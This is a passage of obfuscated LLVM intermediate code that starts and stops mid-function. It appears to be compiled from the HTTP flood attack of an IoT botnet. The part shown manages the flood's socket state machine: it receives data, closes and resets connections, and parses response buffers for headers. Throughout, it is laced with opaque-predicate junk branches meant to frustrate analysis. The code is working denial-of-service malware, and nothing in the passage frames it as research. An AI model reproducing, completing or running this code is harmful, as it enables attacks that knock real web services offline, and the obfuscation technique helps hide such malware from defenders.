  %3304 = getelementptr inbounds [9 x i8], [9 x i8]* %3303, i32 0, i32 0
  %3305 = call signext i8 @util_strcmp(i8* %3304, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %3306 = sext i8 %3305 to i32
  %3307 = icmp ne i32 %3306, 0
  br i1 %3307, label %3308, label %3311

; <label>:3308:                                   ; preds = %3301, %3291
  %3309 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3310 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3309, i32 0, i32 1
  store i8 7, i8* %3310, align 4
  br label %3354

; <label>:3311:                                   ; preds = %3301
  %3312 = load i32, i32* %12, align 4
  %3313 = load i32, i32* %37, align 4
  %3314 = icmp sgt i32 %3312, %3313
  br i1 %3314, label %3315, label %3334

; <label>:3315:                                   ; preds = %3311
  %3316 = load i32, i32* @x.17
  %3317 = load i32, i32* @y.18
  %3318 = sub i32 %3316, 1
  %3319 = mul i32 %3316, %3318
  %3320 = urem i32 %3319, 2
  %3321 = icmp eq i32 %3320, 0
  %3322 = icmp slt i32 %3317, 10
  %3323 = or i1 %3321, %3322
  br i1 %3323, label %originalBB585, label %originalBB585alteredBB

originalBB585:                                    ; preds = %originalBB585alteredBB, %3315
  %3324 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3325 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3324, i32 0, i32 1
  store i8 10, i8* %3325, align 4
  %3326 = load i32, i32* @x.17
  %3327 = load i32, i32* @y.18
  %3328 = sub i32 %3326, 1
  %3329 = mul i32 %3326, %3328
  %3330 = urem i32 %3329, 2
  %3331 = icmp eq i32 %3330, 0
  %3332 = icmp slt i32 %3327, 10
  %3333 = or i1 %3331, %3332
  br i1 %3333, label %originalBBpart2587, label %originalBB585alteredBB

originalBBpart2587:                               ; preds = %originalBB585
  br label %3353

; <label>:3334:                                   ; preds = %3311
  %3335 = load i32, i32* @x.17
  %3336 = load i32, i32* @y.18
  %3337 = sub i32 %3335, 1
  %3338 = mul i32 %3335, %3337
  %3339 = urem i32 %3338, 2
  %3340 = icmp eq i32 %3339, 0
  %3341 = icmp slt i32 %3336, 10
  %3342 = or i1 %3340, %3341
  br i1 %3342, label %originalBB589, label %originalBB589alteredBB

originalBB589:                                    ; preds = %originalBB589alteredBB, %3334
  %3343 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3343, i32 0, i32 1
  store i8 1, i8* %3344, align 4
  %3345 = load i32, i32* @x.17
  %3346 = load i32, i32* @y.18
  %3347 = sub i32 %3345, 1
  %3348 = mul i32 %3345, %3347
  %3349 = urem i32 %3348, 2
  %3350 = icmp eq i32 %3349, 0
  %3351 = icmp slt i32 %3346, 10
  %3352 = or i1 %3350, %3351
  br i1 %3352, label %originalBBpart2591, label %originalBB589alteredBB

originalBBpart2591:                               ; preds = %originalBB589
  br label %3353

; <label>:3353:                                   ; preds = %originalBBpart2591, %originalBBpart2587
  br label %3354

; <label>:3354:                                   ; preds = %3353, %3308
  %3355 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3356 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3355, i32 0, i32 0
  %3357 = load i32, i32* %3356, align 4
  %3358 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %3359 = load i32, i32* %37, align 4
  %3360 = sext i32 %3359 to i64
  %3361 = call i64 @recv(i32 %3357, i8* %3358, i64 %3360, i32 16384)
  %3362 = trunc i64 %3361 to i32
  store i32 %3362, i32* %12, align 4
  br label %4119

; <label>:3363:                                   ; preds = %originalBBpart2272
  %3364 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3365 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3364, i32 0, i32 1
  %3366 = load i8, i8* %3365, align 4
  %3367 = zext i8 %3366 to i32
  %3368 = icmp eq i32 %3367, 7
  br i1 %3368, label %3369, label %3986

; <label>:3369:                                   ; preds = %3363
  br label %3370

; <label>:3370:                                   ; preds = %3984, %3369
  %3371 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3372 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3371, i32 0, i32 1
  %3373 = load i8, i8* %3372, align 4
  %3374 = zext i8 %3373 to i32
  %3375 = icmp ne i32 %3374, 7
  br i1 %3375, label %3376, label %3377

; <label>:3376:                                   ; preds = %3370
  br label %3985

; <label>:3377:                                   ; preds = %3370
  %3378 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3378, i32 0, i32 17
  %3380 = load i32, i32* %3379, align 4
  %3381 = icmp eq i32 %3380, 1024
  br i1 %3381, label %3382, label %3394

; <label>:3382:                                   ; preds = %3377
  %3383 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3384 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3383, i32 0, i32 18
  %3385 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3384, i32 0, i32 0
  %3386 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3386, i32 0, i32 18
  %3388 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3387, i32 0, i32 0
  %3389 = getelementptr inbounds i8, i8* %3388, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3385, i8* %3389, i64 960, i32 1, i1 false)
  %3390 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3391 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3390, i32 0, i32 17
  %3392 = load i32, i32* %3391, align 4
  %3393 = sub nsw i32 %3392, 64
  store i32 %3393, i32* %3391, align 4
  br label %3394

; <label>:3394:                                   ; preds = %3382, %3377
  %3395 = call i32* @__errno_location() #7
  store i32 0, i32* %3395, align 4
  %3396 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3396, i32 0, i32 0
  %3398 = load i32, i32* %3397, align 4
  %3399 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3399, i32 0, i32 18
  %3401 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3400, i32 0, i32 0
  %3402 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3403 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3402, i32 0, i32 17
  %3404 = load i32, i32* %3403, align 4
  %3405 = sext i32 %3404 to i64
  %3406 = getelementptr inbounds i8, i8* %3401, i64 %3405
  %3407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3407, i32 0, i32 17
  %3409 = load i32, i32* %3408, align 4
  %3410 = sub nsw i32 1024, %3409
  %3411 = sext i32 %3410 to i64
  %3412 = call i64 @recv(i32 %3398, i8* %3406, i64 %3411, i32 16384)
  %3413 = trunc i64 %3412 to i32
  store i32 %3413, i32* %12, align 4
  %3414 = load i32, i32* %12, align 4
  %3415 = icmp eq i32 %3414, 0
  br i1 %3415, label %3416, label %3418

; <label>:3416:                                   ; preds = %3394
  %3417 = call i32* @__errno_location() #7
  store i32 104, i32* %3417, align 4
  store i32 -1, i32* %12, align 4
  br label %3418

; <label>:3418:                                   ; preds = %3416, %3394
  %3419 = load i32, i32* @x.17
  %3420 = load i32, i32* @y.18
  %3421 = sub i32 %3419, 1
  %3422 = mul i32 %3419, %3421
  %3423 = urem i32 %3422, 2
  %3424 = icmp eq i32 %3423, 0
  %3425 = icmp slt i32 %3420, 10
  %3426 = or i1 %3424, %3425
  br i1 %3426, label %originalBB593, label %originalBB593alteredBB

originalBB593:                                    ; preds = %originalBB593alteredBB, %3418
  %3427 = load i32, i32* %12, align 4
  %3428 = icmp eq i32 %3427, -1
  %3429 = load i32, i32* @x.17
  %3430 = load i32, i32* @y.18
  %3431 = sub i32 %3429, 1
  %3432 = mul i32 %3429, %3431
  %3433 = urem i32 %3432, 2
  %3434 = icmp eq i32 %3433, 0
  %3435 = icmp slt i32 %3430, 10
  %3436 = or i1 %3434, %3435
  br i1 %3436, label %originalBBpart2595, label %originalBB593alteredBB

originalBBpart2595:                               ; preds = %originalBB593
  br i1 %3428, label %3437, label %3471

; <label>:3437:                                   ; preds = %originalBBpart2595
  %3438 = call i32* @__errno_location() #7
  %3439 = load i32, i32* %3438, align 4
  %3440 = icmp ne i32 %3439, 11
  br i1 %3440, label %3441, label %3470

; <label>:3441:                                   ; preds = %3437
  %3442 = call i32* @__errno_location() #7
  %3443 = load i32, i32* %3442, align 4
  %3444 = icmp ne i32 %3443, 11
  br i1 %3444, label %3445, label %3470

; <label>:3445:                                   ; preds = %3441
  %3446 = load i32, i32* @x.17
  %3447 = load i32, i32* @y.18
  %3448 = sub i32 %3446, 1
  %3449 = mul i32 %3446, %3448
  %3450 = urem i32 %3449, 2
  %3451 = icmp eq i32 %3450, 0
  %3452 = icmp slt i32 %3447, 10
  %3453 = or i1 %3451, %3452
  br i1 %3453, label %originalBB597, label %originalBB597alteredBB

originalBB597:                                    ; preds = %originalBB597alteredBB, %3445
  %3454 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3455 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3454, i32 0, i32 0
  %3456 = load i32, i32* %3455, align 4
  %3457 = call i32 @close(i32 %3456)
  %3458 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3458, i32 0, i32 0
  store i32 -1, i32* %3459, align 4
  %3460 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3461 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3460, i32 0, i32 1
  store i8 0, i8* %3461, align 4
  %3462 = load i32, i32* @x.17
  %3463 = load i32, i32* @y.18
  %3464 = sub i32 %3462, 1
  %3465 = mul i32 %3462, %3464
  %3466 = urem i32 %3465, 2
  %3467 = icmp eq i32 %3466, 0
  %3468 = icmp slt i32 %3463, 10
  %3469 = or i1 %3467, %3468
  br i1 %3469, label %originalBBpart2599, label %originalBB597alteredBB

originalBBpart2599:                               ; preds = %originalBB597
  br label %3470

; <label>:3470:                                   ; preds = %originalBBpart2599, %3441, %3437
  br label %3985

; <label>:3471:                                   ; preds = %originalBBpart2595
  %3472 = load i32, i32* %12, align 4
  %3473 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3474 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3473, i32 0, i32 17
  %3475 = load i32, i32* %3474, align 4
  %3476 = add nsw i32 %3475, %3472
  store i32 %3476, i32* %3474, align 4
  %3477 = load i32, i32* %27, align 4
  %3478 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3479 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3478, i32 0, i32 2
  store i32 %3477, i32* %3479, align 4
  br label %3480

; <label>:3480:                                   ; preds = %3983, %3471
  %3481 = load i32, i32* @x.17
  %3482 = load i32, i32* @y.18
  %3483 = sub i32 %3481, 1
  %3484 = mul i32 %3481, %3483
  %3485 = urem i32 %3484, 2
  %3486 = icmp eq i32 %3485, 0
  %3487 = icmp slt i32 %3482, 10
  %3488 = or i1 %3486, %3487
  br i1 %3488, label %originalBB601, label %originalBB601alteredBB

originalBB601:                                    ; preds = %originalBB601alteredBB, %3480
  store i32 0, i32* %59, align 4
  %3489 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3490 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3489, i32 0, i32 14
  %3491 = load i32, i32* %3490, align 4
  %3492 = icmp sgt i32 %3491, 0
  %3493 = load i32, i32* @x.17
  %3494 = load i32, i32* @y.18
  %3495 = sub i32 %3493, 1
  %3496 = mul i32 %3493, %3495
  %3497 = urem i32 %3496, 2
  %3498 = icmp eq i32 %3497, 0
  %3499 = icmp slt i32 %3494, 10
  %3500 = or i1 %3498, %3499
  br i1 %3500, label %originalBBpart2603, label %originalBB601alteredBB

originalBBpart2603:                               ; preds = %originalBB601
  br i1 %3492, label %3501, label %3768

; <label>:3501:                                   ; preds = %originalBBpart2603
  %3502 = load i32, i32* @x.17
  %3503 = load i32, i32* @y.18
  %3504 = sub i32 %3502, 1
  %3505 = mul i32 %3502, %3504
  %3506 = urem i32 %3505, 2
  %3507 = icmp eq i32 %3506, 0
  %3508 = icmp slt i32 %3503, 10
  %3509 = or i1 %3507, %3508
  br i1 %3509, label %originalBB605, label %originalBB605alteredBB

originalBB605:                                    ; preds = %originalBB605alteredBB, %3501
  %3510 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3511 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3510, i32 0, i32 14
  %3512 = load i32, i32* %3511, align 4
  %3513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3513, i32 0, i32 17
  %3515 = load i32, i32* %3514, align 4
  %3516 = icmp sgt i32 %3512, %3515
  %3517 = load i32, i32* @x.17
  %3518 = load i32, i32* @y.18
  %3519 = sub i32 %3517, 1
  %3520 = mul i32 %3517, %3519
  %3521 = urem i32 %3520, 2
  %3522 = icmp eq i32 %3521, 0
  %3523 = icmp slt i32 %3518, 10
  %3524 = or i1 %3522, %3523
  br i1 %3524, label %originalBBpart2607, label %originalBB605alteredBB

originalBBpart2607:                               ; preds = %originalBB605
  br i1 %3516, label %3525, label %3545

; <label>:3525:                                   ; preds = %originalBBpart2607
  %3526 = load i32, i32* @x.17
  %3527 = load i32, i32* @y.18
  %3528 = sub i32 %3526, 1
  %3529 = mul i32 %3526, %3528
  %3530 = urem i32 %3529, 2
  %3531 = icmp eq i32 %3530, 0
  %3532 = icmp slt i32 %3527, 10
  %3533 = or i1 %3531, %3532
  br i1 %3533, label %originalBB609, label %originalBB609alteredBB

originalBB609:                                    ; preds = %originalBB609alteredBB, %3525
  %3534 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3535 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3534, i32 0, i32 17
  %3536 = load i32, i32* %3535, align 4
  %3537 = load i32, i32* @x.17
  %3538 = load i32, i32* @y.18
  %3539 = sub i32 %3537, 1
  %3540 = mul i32 %3537, %3539
  %3541 = urem i32 %3540, 2
  %3542 = icmp eq i32 %3541, 0
  %3543 = icmp slt i32 %3538, 10
  %3544 = or i1 %3542, %3543
  br i1 %3544, label %originalBBpart2611, label %originalBB609alteredBB

originalBBpart2611:                               ; preds = %originalBB609
  br label %3549

; <label>:3545:                                   ; preds = %originalBBpart2607
  %3546 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3547 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3546, i32 0, i32 14
  %3548 = load i32, i32* %3547, align 4
  br label %3549

; <label>:3549:                                   ; preds = %3545, %originalBBpart2611
  %3550 = phi i32 [ %3536, %originalBBpart2611 ], [ %3548, %3545 ]
  %3551 = load i32, i32* @x.17
  %3552 = load i32, i32* @y.18
  %3553 = sub i32 %3551, 1
  %3554 = mul i32 %3551, %3553
  %3555 = urem i32 %3554, 2
  %3556 = icmp eq i32 %3555, 0
  %3557 = icmp slt i32 %3552, 10
  %3558 = or i1 %3556, %3557
  br i1 %3558, label %originalBB613, label %originalBB613alteredBB

originalBB613:                                    ; preds = %originalBB613alteredBB, %3549
  store i32 %3550, i32* %59, align 4
  %3559 = load i32, i32* %59, align 4
  %3560 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3561 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3560, i32 0, i32 14
  %3562 = load i32, i32* %3561, align 4
  %3563 = sub nsw i32 %3562, %3559
  store i32 %3563, i32* %3561, align 4
  %3564 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3565 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3564, i32 0, i32 11
  %3566 = load i32, i32* %3565, align 4
  %3567 = icmp eq i32 %3566, 1
  %3568 = load i32, i32* @x.17
  %3569 = load i32, i32* @y.18
  %3570 = sub i32 %3568, 1
  %3571 = mul i32 %3568, %3570
  %3572 = urem i32 %3571, 2
  %3573 = icmp eq i32 %3572, 0
  %3574 = icmp slt i32 %3569, 10
  %3575 = or i1 %3573, %3574
  br i1 %3575, label %originalBBpart2621, label %originalBB613alteredBB

originalBBpart2621:                               ; preds = %originalBB613
  br i1 %3567, label %3576, label %3767

; <label>:3576:                                   ; preds = %originalBBpart2621
  %3577 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3577, i32 0, i32 18
  %3579 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3578, i32 0, i32 0
  %3580 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3581 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3580, i32 0, i32 17
  %3582 = load i32, i32* %3581, align 4
  %3583 = call i8* @table_retrieve_val(i32 52, i32* null)
  %3584 = call i32 @util_memsearch(i8* %3579, i32 %3582, i8* %3583, i32 11)
  %3585 = icmp ne i32 %3584, -1
  br i1 %3585, label %3586, label %3750

; <label>:3586:                                   ; preds = %3576
  %3587 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3588 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3587, i32 0, i32 18
  %3589 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3588, i32 0, i32 0
  %3590 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3591 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3590, i32 0, i32 17
  %3592 = load i32, i32* %3591, align 4
  %3593 = call i8* @table_retrieve_val(i32 52, i32* null)
  %3594 = call i32 @util_memsearch(i8* %3589, i32 %3592, i8* %3593, i32 11)
  store i32 %3594, i32* %60, align 4
  %3595 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3595, i32 0, i32 18
  %3597 = load i32, i32* %60, align 4
  %3598 = sext i32 %3597 to i64
  %3599 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3596, i64 0, i64 %3598
  %3600 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3601 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3600, i32 0, i32 17
  %3602 = load i32, i32* %3601, align 4
  %3603 = load i32, i32* %60, align 4
  %3604 = sub nsw i32 %3602, %3603
  %3605 = call i32 @util_memsearch(i8* %3599, i32 %3604, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3605, i32* %61, align 4
  %3606 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3607 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3606, i32 0, i32 18
  %3608 = load i32, i32* %60, align 4
  %3609 = load i32, i32* %61, align 4
  %3610 = sub nsw i32 %3609, 1
  %3611 = add nsw i32 %3608, %3610
  %3612 = sext i32 %3611 to i64
  %3613 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3607, i64 0, i64 %3612
  store i8 0, i8* %3613, align 1
  %3614 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3615 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3614, i32 0, i32 15
  %3616 = load i32, i32* %3615, align 4
  %3617 = icmp slt i32 %3616, 5
  br i1 %3617, label %3618, label %3729

; <label>:3618:                                   ; preds = %3586
  %3619 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3620 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3619, i32 0, i32 18
  %3621 = load i32, i32* %60, align 4
  %3622 = sext i32 %3621 to i64
  %3623 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3620, i64 0, i64 %3622
  %3624 = call i32 @util_strlen(i8* %3623)
  %3625 = icmp slt i32 %3624, 128
  br i1 %3625, label %3626, label %3729

; <label>:3626:                                   ; preds = %3618
  %3627 = load i32, i32* @x.17
  %3628 = load i32, i32* @y.18
  %3629 = sub i32 %3627, 1
  %3630 = mul i32 %3627, %3629
  %3631 = urem i32 %3630, 2
  %3632 = icmp eq i32 %3631, 0
  %3633 = icmp slt i32 %3628, 10
  %3634 = or i1 %3632, %3633
  br i1 %3634, label %originalBB623, label %originalBB623alteredBB

originalBB623:                                    ; preds = %originalBB623alteredBB, %3626
  %3635 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3636 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3635, i32 0, i32 16
  %3637 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3638 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3637, i32 0, i32 15
  %3639 = load i32, i32* %3638, align 4
  %3640 = sext i32 %3639 to i64
  %3641 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3636, i64 0, i64 %3640
  %3642 = getelementptr inbounds [128 x i8], [128 x i8]* %3641, i32 0, i32 0
  %3643 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3644 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3643, i32 0, i32 18
  %3645 = load i32, i32* %60, align 4
  %3646 = sext i32 %3645 to i64
  %3647 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3644, i64 0, i64 %3646
  %3648 = call i32 @util_strcpy(i8* %3642, i8* %3647)
  %3649 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3650 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3649, i32 0, i32 16
  %3651 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3652 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3651, i32 0, i32 15
  %3653 = load i32, i32* %3652, align 4
  %3654 = sext i32 %3653 to i64
  %3655 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3650, i64 0, i64 %3654
  %3656 = getelementptr inbounds [128 x i8], [128 x i8]* %3655, i32 0, i32 0
  %3657 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3658 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3657, i32 0, i32 16
  %3659 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3660 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3659, i32 0, i32 15
  %3661 = load i32, i32* %3660, align 4
  %3662 = sext i32 %3661 to i64
  %3663 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3658, i64 0, i64 %3662
  %3664 = getelementptr inbounds [128 x i8], [128 x i8]* %3663, i32 0, i32 0
  %3665 = call i32 @util_strlen(i8* %3664)
  %3666 = sext i32 %3665 to i64
  %3667 = getelementptr inbounds i8, i8* %3656, i64 %3666
  %3668 = call i32 @util_strcpy(i8* %3667, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %3669 = load i32, i32* %61, align 4
  %3670 = add nsw i32 %3669, 3
  %3671 = load i32, i32* %60, align 4
  %3672 = add nsw i32 %3671, %3670
  store i32 %3672, i32* %60, align 4
  %3673 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3674 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3673, i32 0, i32 18
  %3675 = load i32, i32* %60, align 4
  %3676 = sext i32 %3675 to i64
  %3677 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3674, i64 0, i64 %3676
  %3678 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3679 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3678, i32 0, i32 17
  %3680 = load i32, i32* %3679, align 4
  %3681 = load i32, i32* %60, align 4
  %3682 = sub nsw i32 %3680, %3681
  %3683 = call i32 @util_memsearch(i8* %3677, i32 %3682, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %3683, i32* %61, align 4
  %3684 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3685 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3684, i32 0, i32 18
  %3686 = load i32, i32* %60, align 4
  %3687 = load i32, i32* %61, align 4
  %3688 = sub nsw i32 %3687, 1
  %3689 = add nsw i32 %3686, %3688
  %3690 = sext i32 %3689 to i64
  %3691 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3685, i64 0, i64 %3690
  store i8 0, i8* %3691, align 1
  %3692 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3693 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3692, i32 0, i32 16
  %3694 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3695 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3694, i32 0, i32 15
  %3696 = load i32, i32* %3695, align 4
  %3697 = sext i32 %3696 to i64
  %3698 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3693, i64 0, i64 %3697
  %3699 = getelementptr inbounds [128 x i8], [128 x i8]* %3698, i32 0, i32 0
  %3700 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3701 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3700, i32 0, i32 16
  %3702 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3703 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3702, i32 0, i32 15
  %3704 = load i32, i32* %3703, align 4
  %3705 = sext i32 %3704 to i64
  %3706 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %3701, i64 0, i64 %3705
  %3707 = getelementptr inbounds [128 x i8], [128 x i8]* %3706, i32 0, i32 0
  %3708 = call i32 @util_strlen(i8* %3707)
  %3709 = sext i32 %3708 to i64
  %3710 = getelementptr inbounds i8, i8* %3699, i64 %3709
  %3711 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3712 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3711, i32 0, i32 18
  %3713 = load i32, i32* %60, align 4
  %3714 = sext i32 %3713 to i64
  %3715 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3712, i64 0, i64 %3714
  %3716 = call i32 @util_strcpy(i8* %3710, i8* %3715)
  %3717 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3718 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3717, i32 0, i32 15
  %3719 = load i32, i32* %3718, align 4
  %3720 = add nsw i32 %3719, 1
  store i32 %3720, i32* %3718, align 4
  %3721 = load i32, i32* @x.17
  %3722 = load i32, i32* @y.18
  %3723 = sub i32 %3721, 1
  %3724 = mul i32 %3721, %3723
  %3725 = urem i32 %3724, 2
  %3726 = icmp eq i32 %3725, 0
  %3727 = icmp slt i32 %3722, 10
  %3728 = or i1 %3726, %3727
  br i1 %3728, label %originalBBpart2665, label %originalBB623alteredBB

originalBBpart2665:                               ; preds = %originalBB623
  br label %3729

; <label>:3729:                                   ; preds = %originalBBpart2665, %3618, %3586
  %3730 = load i32, i32* @x.17
  %3731 = load i32, i32* @y.18
  %3732 = sub i32 %3730, 1
  %3733 = mul i32 %3730, %3732
  %3734 = urem i32 %3733, 2
  %3735 = icmp eq i32 %3734, 0
  %3736 = icmp slt i32 %3731, 10
  %3737 = or i1 %3735, %3736
  br i1 %3737, label %originalBB667, label %originalBB667alteredBB

originalBB667:                                    ; preds = %originalBB667alteredBB, %3729
  %3738 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3739 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3738, i32 0, i32 14
  store i32 -1, i32* %3739, align 4
  %3740 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3741 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3740, i32 0, i32 1
  store i8 10, i8* %3741, align 4
  %3742 = load i32, i32* @x.17
  %3743 = load i32, i32* @y.18
  %3744 = sub i32 %3742, 1
  %3745 = mul i32 %3742, %3744
  %3746 = urem i32 %3745, 2
  %3747 = icmp eq i32 %3746, 0
  %3748 = icmp slt i32 %3743, 10
  %3749 = or i1 %3747, %3748
  br i1 %3749, label %originalBBpart2669, label %originalBB667alteredBB

originalBBpart2669:                               ; preds = %originalBB667
  br label %3984

; <label>:3750:                                   ; preds = %3576
  %3751 = load i32, i32* @x.17
  %3752 = load i32, i32* @y.18
  %3753 = sub i32 %3751, 1
  %3754 = mul i32 %3751, %3753
  %3755 = urem i32 %3754, 2
  %3756 = icmp eq i32 %3755, 0
  %3757 = icmp slt i32 %3752, 10
  %3758 = or i1 %3756, %3757
  br i1 %3758, label %originalBB671, label %originalBB671alteredBB

originalBB671:                                    ; preds = %originalBB671alteredBB, %3750
  %3759 = load i32, i32* @x.17
  %3760 = load i32, i32* @y.18
  %3761 = sub i32 %3759, 1
  %3762 = mul i32 %3759, %3761
  %3763 = urem i32 %3762, 2
  %3764 = icmp eq i32 %3763, 0
